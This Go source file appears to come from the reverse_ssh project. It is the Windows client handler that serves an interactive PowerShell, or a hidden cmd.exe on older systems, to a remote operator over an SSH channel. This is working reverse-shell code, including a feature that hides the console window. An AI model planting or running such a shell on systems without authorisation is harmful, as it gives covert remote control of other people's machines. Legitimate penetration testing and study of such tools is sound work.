//go:build windows
// +build windows

package client

import (
	"fmt"
	"io"
	"os"
	"os/exec"
	"os/signal"
	"syscall"

	"github.com/ActiveState/termtest/conpty"
	"github.com/NHAS/reverse_ssh/internal"
	"github.com/NHAS/reverse_ssh/internal/server/terminal"
	"github.com/NHAS/reverse_ssh/pkg/logger"
	"golang.org/x/crypto/ssh"
	"golang.org/x/sys/windows"
)

//The basic windows shell handler, as there arent any good golang libraries to work with windows conpty
func shellChannel(user *internal.User, newChannel ssh.NewChannel, log logger.Logger) {

	// At this point, we have the opportunity to reject the client's.
	// request for another logical connection
	connection, requests, err := newChannel.Accept()
	if err != nil {
		log.Error("Could not accept channel (%s)", err)
		return
	}
	defer connection.Close()

	for req := range requests {
		log.Info("Got request: %s", req.Type)
		switch req.Type {

		case "shell":
			// We only accept the default shell
			// (i.e. no command in the Payload)
			req.Reply(len(req.Payload) == 0, nil)

		case "pty-req":
			req.Reply(true, nil)

			vsn := windows.RtlGetVersion()
			if vsn.MajorVersion < 10 || vsn.BuildNumber < 17763 {
				log.Info("Windows version too old for Conpty (%d, %d), using basic shell", vsn.MajorVersion, vsn.BuildNumber)
				basicShell(requests, connection, log)
			} else {
				ptyreq, _ := internal.ParsePtyReq(req.Payload)
				err = conptyShell(requests, connection, log, ptyreq)
				if err != nil {
					log.Error("%v", err)
				}
			}

			connection.Close()

		default:
			req.Reply(false, nil)
		}
	}

}

func conptyShell(reqs <-chan *ssh.Request, connection ssh.Channel, log logger.Logger, ptyReq internal.PtyReq) error {

	cpty, err := conpty.New(int16(ptyReq.Columns), int16(ptyReq.Rows))
	if err != nil {
		return fmt.Errorf("Could not open a conpty terminal: %v", err)
	}
	defer cpty.Close()

	// Spawn and catch new powershell process
	pid, _, err := cpty.Spawn(
		"C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
		[]string{},
		&syscall.ProcAttr{
			Env: os.Environ(),
		},
	)
	if err != nil {
		return fmt.Errorf("Could not spawn a powershell: %v", err)
	}
	log.Info("New process with pid %d spawned", pid)
	process, err := os.FindProcess(pid)
	if err != nil {
		log.Fatal("Failed to find process: %v", err)
	}

	// Dynamically handle resizes of terminal window
	go func() {
		for req := range reqs {
			switch req.Type {

			case "window-change":
				w, h := internal.ParseDims(req.Payload)
				cpty.Resize(uint16(w), uint16(h))

			}

		}
	}()

	// Link data streams of ssh session and conpty
	go io.Copy(connection, cpty.OutPipe())
	go io.Copy(cpty.InPipe(), connection)

	_, err = process.Wait()
	if err != nil {
		return fmt.Errorf("Error waiting for process: %v", err)
	}

	return nil
}

func basicShell(reqs <-chan *ssh.Request, connection ssh.Channel, log logger.Logger) {

	c := make(chan os.Signal, 1)
	expected := make(chan bool, 1)

	signal.Notify(c, os.Interrupt)
	signal.Notify(c, syscall.SIGTERM)

	go func() {
		for {
			select {
			case <-c:
				os.Exit(0)
			case <-expected:
				<-c

			}
		}
	}()

	cmd := exec.Command("cmd.exe")
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: syscall.STARTF_USESTDHANDLES,
	}

	stdout, err := cmd.StdoutPipe()
	if err != nil {
		log.Error("%s", err)
		return
	}

	cmd.Stderr = cmd.Stdout

	stdin, err := cmd.StdinPipe()
	if err != nil {
		log.Error("%s", err)
		return
	}

	term := terminal.NewTerminal(connection, "")
	// Dynamically handle resizes of terminal window
	go func() {
		for req := range reqs {
			switch req.Type {

			case "window-change":
				w, h := internal.ParseDims(req.Payload)
				term.SetSize(int(w), int(h))

			}

		}
	}()

	ignoredByes := 0
	go func() {

		buf := make([]byte, 128)

		for {

			n, err := stdout.Read(buf)
			if err != nil {
				if err != io.EOF {
					log.Error("%s", err)
				}
				return
			}

			//This should ignore the echo'd result from cmd.exe on newline, this isnt super thread safe, but should be okay.
			_, err = term.Write(buf[ignoredByes:n])
			if err != nil {
				log.Error("%s", err)
				return
			}

			ignoredByes = 0

		}
	}()

	go func() {

		for {
			//This will break if the user does CTRL+D apparently we need to reset the whole terminal if a user does this.... so just exit instead
			line, err := term.ReadLine()
			if err != nil && err != terminal.ErrCtrlC {
				log.Error("%s", err)
				return
			}

			if err == terminal.ErrCtrlC {
				expected <- true
				err := sendCtrlC(cmd.Process.Pid)
				if err != nil {
					fmt.Fprintf(term, "Failed to send Ctrl+C sorry! You are most likely trapped: %s", err)
					log.Error("%s", err)
				}
			}

			if err == nil {
				_, err := stdin.Write([]byte(line + "\r\n"))
				if err != nil {
					fmt.Fprintf(term, "Error writing to STDIN: %s", err)
					log.Error("%s", err)
				}
				ignoredByes = len(line)
			}

		}

	}()

	err = cmd.Run()
	if err != nil {
		log.Error("%s", err)
	}
}

func sendCtrlC(pid int) error {

	d, e := syscall.LoadDLL("kernel32.dll")

	if e != nil {

		return fmt.Errorf("LoadDLL: %v\n", e)

	}

	p, e := d.FindProc("GenerateConsoleCtrlEvent")

	if e != nil {

		return fmt.Errorf("FindProc: %v\n", e)

	}
	r, _, e := p.Call(syscall.CTRL_C_EVENT, uintptr(pid))

	if r == 0 {

		return fmt.Errorf("GenerateConsoleCtrlEvent: %v\n", e)

	}

	return nil

}
